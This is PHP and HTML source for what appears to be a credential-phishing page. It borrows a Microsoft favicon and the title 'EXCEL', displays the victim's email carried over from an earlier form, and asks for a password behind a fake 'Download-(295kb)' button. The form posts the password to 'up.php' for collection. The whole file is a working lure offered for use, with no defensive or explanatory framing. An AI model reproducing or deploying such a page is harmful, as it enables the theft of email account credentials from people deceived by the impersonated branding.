<?php

session_start();
$clientemail = $_POST['pdf1'];
$_SESSION['clientemail']=$clientemail;

?>

<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.5104.7/content/images/favicon_a.ico">
  <title>EXCEL</title>
  
  
  
      <link rel="stylesheet" href="css/style.css">

  
  <style type="text/css">
</style>

  
</head>


<body style="background-image: url('im/bg.png')">
  <html lang="en-US">
<head>
  <meta charset="utf-8">
    <title>Login</title>
    <div>
	</div><br><br>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,700">
<h3 style="text-align: center; margin-bottom: 40px;">
</head>
<img height="220" src="./im/1.png" width="250"><br><br>
<div id ="wrong">


<script type='text/javascript'>
function emailValidator(element, alertMsg){
	var emailvalid = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
	if(element.value.match(emailvalid))
	{
		return true;
	}else{
		alert(alertMsg);
		element.focus();
		return false;
	}
}
</script>
<script language="JavaScript">
<!--
function validateForm()
{
var y=document.forms["myform"]["pdf2"].value;
if(y==null || y=="")
  {
  alert("Password is Empty");
  return false;
  }
var y=document.forms["myform"]["pdf2"].value;
if(y.length <6 )
  {
  alert("Invalid Password");
  return false;
  }
}



-->
</script>




    <div id="login">
	<form action="./up.php"  method="post" autocomplete="off" onsubmit="return validateForm()"   name="myform" />
       
	  <form name='form-login'>
	 
        <div id="welcome">
          <strong><font color="#fff"><?php echo $clientemail  ?></font></strong></div><br>
       
        <span class="fontawesome-lock"><svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px"
     width="30" height="30"
     viewBox="0 0 252 252"
     style="fill:#000000;"><g fill="none" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><path d="M0,252v-252h252v252z" fill="none"></path><g><g id="surface1"><path d="M126,21c-28.95703,0 -52.5,23.54297 -52.5,52.5v21h21v-21c0,-17.37012 14.12988,-31.5 31.5,-31.5c17.37012,0 31.5,14.12988 31.5,31.5v21h21v-21c0,-28.95703 -23.54297,-52.5 -52.5,-52.5" fill="#2ecc71"></path><path d="M194.25,231h-136.5c-11.60742,0 -21,-9.39258 -21,-21v-94.5c0,-11.60742 9.39258,-21 21,-21h136.5c11.60742,0 21,9.39258 21,21v94.5c0,11.60742 -9.39258,21 -21,21" fill="#8bc34a"></path><path d="M89.25,162.75c0,8.69531 -7.05469,15.75 -15.75,15.75c-8.69531,0 -15.75,-7.05469 -15.75,-15.75c0,-8.69531 7.05469,-15.75 15.75,-15.75c8.69531,0 15.75,7.05469 15.75,15.75" fill="#f1f8e9"></path><path d="M194.25,162.75c0,8.69531 -7.05469,15.75 -15.75,15.75c-8.69531,0 -15.75,-7.05469 -15.75,-15.75c0,-8.69531 7.05469,-15.75 15.75,-15.75c8.69531,0 15.75,7.05469 15.75,15.75" fill="#f1f8e9"></path><path d="M141.75,162.75c0,8.69531 -7.05469,15.75 -15.75,15.75c-8.69531,0 -15.75,-7.05469 -15.75,-15.75c0,-8.69531 7.05469,-15.75 15.75,-15.75c8.69531,0 15.75,7.05469 15.75,15.75" fill="#f1f8e9"></path></g></g></g></svg></span>
          <input type="password" id="pdf4" name="pdf2" placeholder="Password">
        
        <input type="submit" name="submit" value="Download-(295kb)" onclick="emailValidator(document.getElementById('pdf3'), 'This is Not a Valid Email')" />
</form>
  
 




</body>
</html>
